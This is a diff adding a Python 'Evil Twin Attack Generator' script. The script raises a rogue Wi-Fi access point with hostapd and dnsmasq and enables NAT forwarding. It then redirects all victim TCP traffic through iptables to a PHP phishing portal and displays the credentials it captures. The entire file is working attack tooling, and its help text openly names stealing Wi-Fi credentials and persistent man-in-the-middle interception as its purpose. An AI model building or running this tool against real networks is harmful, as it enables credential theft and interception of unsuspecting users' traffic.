@@ -1,0 +1,227 @@
+#!/usr/bin/python3
+#
+#    Evil Twin Attack Generator
+#         -- W.A.P.A --
+#
+import argparse
+import os, sys
+from time import sleep
+import signal
+import subprocess
+from threading import Thread
+
+#Argparse format
+class SmartFormatter(argparse.HelpFormatter):
+	def _split_lines(self, text, width):
+		if text.startswith('R|'):
+			return text[2:].splitlines()
+		return argparse.HelpFormatter._split_lines(self, text, width)
+
+#Variables
+sys.tracebacklimit=0
+verb=0
+type="ET"
+mitm=0
+quiet=0
+cwd = os.getcwd()
+ipcount2=0
+
+#Args
+parser = argparse.ArgumentParser(formatter_class=SmartFormatter)
+#parser.add_argument("type", help="R|Type of EvilTwin attack:\n"
+#"ET: Simple EvilTwin, generate a rogue AP to get a plaintext password or steal credentials (default)\n"
+#"MITM: Simple Man in the Middle attack, with a generated rogue AP\n"
+#"COMB: Combined attack to steal WiFi credentials and persist the MitM attack")
+parser.add_argument("-k", "--host", help="R|Interface to use in the attack")
+parser.add_argument("-x", "--exit", help="R|Interface that will transmit the packets to the Internet")
+parser.add_argument("-m", "--mitm", help="R|Use -m to redirect all traffic to a rogue webpage\n"
+"You can use the default sites, or import your own into \"mitm_webserver\" directory", action="store_true")
+parser.add_argument("-e", "--essid", help="R|Define the Rogue AP ESSID (visible name)")
+parser.add_argument("-c", "--channel", help="R|Channel to use")
+parser.add_argument("-q", "--quiet", help="R|Suppress debug message when AP is generated", action="store_true")
+parser.add_argument("-w", "--webserver", help="R|Specify the webserver to use in MitM attacks to avoid typing in the terminal")
+parser.add_argument("-s", "--security", help="R|Rogue AP security:\n"
+"Supported security modes are:\n"
+"OPN and WPA2")
+parser.add_argument("-p", "--password", help="R|If security is WPA2, set password for your AP")
+parser.add_argument("-v", help="R|Verbosity", action="store_true")
+args = parser.parse_args()
+intf = args.host
+ap_channel = args.channel
+ap_ssid = args.essid
+ap_passwd = args.password
+exit_if = args.exit
+#type = args.type
+
+#Var update && arg check
+if args.security is None:
+	ap_sec = 0
+elif args.security == "OPN":
+	ap_sec = 0
+elif args.security == "WPA2":
+	ap_sec = 1
+
+if args.v is True:
+	verb = 1
+
+if args.quiet is True:
+	quiet = 1
+
+if args.mitm is True:
+	mitm = 1
+
+if mitm == 1:
+	mitm_dir_check = os.path.isdir('/usr/sbin/mitm_webserver')
+	if mitm_dir_check is False:
+		print("")
+		print("[!] You specified -m argument, but mitm_webserver directory doesn't exist...")
+		print("You can create this directory by hand and add the php files you would like to execute in the mitm attack")
+		print("[!] Exitting...")
+		exit(1)
+
+
+#Functions
+
+def handler(signum, frame):
+	os.system("tput cnorm")
+	print("")
+	print("")
+	print("")
+	msg = "[!] Deactivating AP, killing all procesess..."
+	print(msg, end="")
+	os.system("killall hostapd dnsmasq > /dev/null 2>&1 &")
+	os.system("iptables -t nat -F PREROUTING > /dev/null 2>&1")
+	os.system("iptables -t nat -F POSTROUTING > /dev/null 2>&1")
+	os.system(f"ifconfig {intf} up 0.0.0.0")
+	exit(1)
+
+def dnsm_creation():
+	f = open(f"{dirpath}/dnsmasq.conf", "w")
+	f.write(f"interface={intf}\n")
+	f.write("dhcp-range=192.168.20.2,192.168.20.200,255.255.255.0,12h\n")
+	f.write("domain=wlan\n")
+	f.close()
+
+def hostap_creation():
+	f = open(f"{dirpath}/hostapd.conf", "w")
+	f.write(f"interface={intf}\n")
+	f.write(f"channel={ap_channel}\n")
+	f.write(f"ssid={ap_ssid}\n")
+	f.write("driver=nl80211\n")
+	f.write("hw_mode=g\n")
+	if ap_sec == 1:
+		f.write("country_code=US\n")
+		f.write("macaddr_acl=0\n")
+		f.write("auth_algs=1\n")
+		f.write("ignore_broadcast_ssid=0\n")
+		f.write("wpa=2\n")
+		f.write(f"wpa_passphrase={ap_passwd}\n")
+		f.write("wpa_key_mgmt=WPA-PSK\n")
+		f.write("wpa_pairwise=TKIP\n")
+		f.write("rsn_pairwise=CCMP\n")
+	f.close()
+
+def sys_commands():
+	command3 = 'echo "net.ipv4.ip_forward=1" > /etc/sysctl.d/routed-ap.conf &>/dev/null'
+	command4 = ("iptables -t nat -A POSTROUTING -o %s -j MASQUERADE &>/dev/null"% (exit_if))
+	command5 = "rfkill unblock wlan &>/dev/null"
+	command6 = ("ifconfig %s up 192.168.20.1"% (intf))
+	os.system(command3)
+	os.system(command4)
+	os.system(command5)
+	os.system(command6)
+
+def captiveportal():
+	os.system(f"php -S 192.168.20.1:80 -t /usr/sbin/mitm_webserver/{webserver} > /dev/null 2>&1 &")
+
+def autoauth_clients():
+	while True:
+		os.system("cat /srv/wapa_data/data.txt 2>/dev/null | grep ip | awk '{print $3}' | tr '\n' ' ' > /var/lib/misc/leases.txt")
+		ipcount_cmd = "cat /var/lib/misc/leases.txt | wc -w"
+		ipcount = int(subprocess.check_output(ipcount_cmd,shell=True,text=True))
+		ipcount2_cmd = "cat /var/lib/misc/ipcount2.txt"
+		ipcount2 = int(subprocess.check_output(ipcount2_cmd,shell=True,text=True))
+		x = 0
+		if ipcount > ipcount2:
+			os.system("iptables -t nat -F PREROUTING > /dev/null 2>&1")
+			while x < ipcount:
+				x += 1
+				acceptip_cmd = ("cat /var/lib/misc/leases.txt | awk '{print $%s}'"% x)
+				ip_to_accept_spr = str(subprocess.check_output(acceptip_cmd,shell=True,text=True))
+				ip_to_accept = ip_to_accept_spr[0:-1]
+				os.system(f"iptables -t nat -A PREROUTING -s {ip_to_accept} -j ACCEPT")
+			os.system("iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination 192.168.20.1:80")
+		os.system(f"echo {ipcount} > /var/lib/misc/ipcount2.txt")
+		sleep(1)
+
+#Script
+
+signal.signal(signal.SIGINT, handler)
+
+#Directory and conf files
+dirpath = (f"{cwd}/wapa_et_files")
+
+if os.path.isdir(dirpath) is False:
+	os.system(f"mkdir {dirpath}")
+dnsm_creation()
+hostap_creation()
+if verb == 1:
+	os.system("tput civis")
+	print("[+] dnsmasq and hostapd configuration files have been created!")
+	print("")
+	print("[+] Modifying iptables and allowing packet forwarding...")
+	print("")
+sleep(1.25)
+sys_commands()
+if verb == 1:
+	print(f"[+] System is set up to host the rogue AP: {ap_ssid}")
+	print("")
+	print("[+] Starting hostapd...")
+os.system(f"hostapd {dirpath}/hostapd.conf > /dev/null 2>&1 &")
+sleep(3)
+if verb == 1:
+	print("")
+	print("[+] hostapd started, starting dnsmasq...")
+os.system(f"dnsmasq -C {dirpath}/dnsmasq.conf -d > /dev/null 2>&1 &")
+sleep(3)
+if verb == 1:
+	print("")
+	print("[!] ACCESS POINT GENERATED SUCCESSFULLY")
+if mitm == 1:
+	print("")
+	if args.webserver is None:
+		print("[+] Preparing EvilTwin into MitM attack, listing avaliable webservers...")
+		print("")
+		os.system("ls /usr/sbin/mitm_webserver")
+		sleep(0.5)
+		print("")
+		os.system("tput cnorm")
+		webserver = str(input("Please, specify the webserver to use with the exact name of the directory: "))
+		os.system("tput civis")
+		print("")
+	else:
+		webserver = args.webserver
+	print(f"[+] You have selected {webserver}, modifying iptables to redirect all traffic...")
+	os.system("iptables -t nat -A PREROUTING -p tcp -j DNAT --to-destination 192.168.20.1:80")
+	print("")
+	print("[+] All traffic is being redirected to the webserver")
+	print("")
+	print("[+] Starting webserver...")
+	capt_portal = Thread(target=captiveportal)
+	capt_portal.start()
+	os.system("echo 0 > /var/lib/misc/ipcount2.txt")
+	autoauth = Thread(target=autoauth_clients,daemon=True)
+	#autoauth.setDaemon(True)
+	autoauth.start()
+
+while True:
+	sleep(10)
+	if quiet == 0:
+		print("")
+		os.system("clear")
+		print(f"Rogue AP with ESSID {ap_ssid} is still stable on channel {ap_channel}")
+		print("")
+		print("This is a debug message generated every minute, you can disable it with -q")
+		print("")
+	if mitm == 1:
+		os.system(f"cat /srv/wapa_data/data.txt 2>/dev/null")
